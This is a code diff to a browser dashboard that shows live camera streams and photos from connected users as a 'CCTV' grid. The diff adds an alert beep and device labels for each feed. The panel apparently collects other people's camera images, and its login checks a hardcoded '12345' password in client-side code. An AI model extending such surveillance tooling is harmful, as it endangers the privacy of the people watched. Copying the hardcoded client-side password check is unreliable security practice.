@@ -78,7 +78,7 @@
         .cctv-header {
             background: #252525;
             padding: 8px 12px;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: bold;
             display: flex;
             justify-content: space-between;
@@ -204,6 +204,22 @@
         const socket = io();
         let isLinkActive = true;
 
+        // Subtle Beep Alert Sound using Web Audio API
+        function playBeep() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'sine';
+                osc.frequency.value = 800;
+                gain.gain.value = 0.1;
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                setTimeout(() => osc.stop(), 150);
+            } catch (e) {}
+        }
+
         function login() {
             const pass = document.getElementById('passInput').value;
             if (pass === '12345') {
@@ -238,6 +254,7 @@
         }
 
         function renderPhotoCard(imageData, fileName) {
+            playBeep();
             const emptyMsg = document.getElementById('emptyMsg');
             if (emptyMsg) emptyMsg.style.display = 'none';
 
@@ -269,7 +286,7 @@
             gallery.insertBefore(card, gallery.firstChild);
         }
 
-        // Update active users list and build CCTV Grid boxes
+        // Update active users list with device info
         socket.on('update-users-list', (usersList) => {
             const userIds = Object.keys(usersList);
             document.getElementById('activeCount').innerText = `Active Users: ${userIds.length}`;
@@ -284,18 +301,19 @@
                 if (noUsersMsg) noUsersMsg.style.display = 'none';
             }
 
-            // Keep existing boxes or create new ones
             userIds.forEach((id, index) => {
                 let boxId = `cctv_${id}`;
                 let card = document.getElementById(boxId);
+                const userInfo = usersList[id].deviceInfo || "Unknown Device";
 
                 if (!card) {
+                    playBeep();
                     card = document.createElement('div');
                     card.className = 'cctv-card';
                     card.id = boxId;
                     card.innerHTML = `
                         <div class="cctv-header">
-                            <span>CAM #${index + 1} (${id.substr(0, 4)})</span>
+                            <span>CAM #${index + 1}: ${userInfo}</span>
                             <span class="live-badge">LIVE</span>
                         </div>
                         <div class="cctv-body">
@@ -309,7 +327,6 @@
                 }
             });
 
-            // Remove disconnected user boxes
             Array.from(grid.children).forEach(child => {
                 if (child.id && child.id.startsWith('cctv_')) {
                     const socketId = child.id.replace('cctv_', '');
@@ -320,7 +337,6 @@
             });
         });
 
-        // Update live stream for respective CCTV box
         socket.on('update-live-stream', (data) => {
             const imgElem = document.getElementById(`img_${data.socketId}`);
             if (imgElem) {
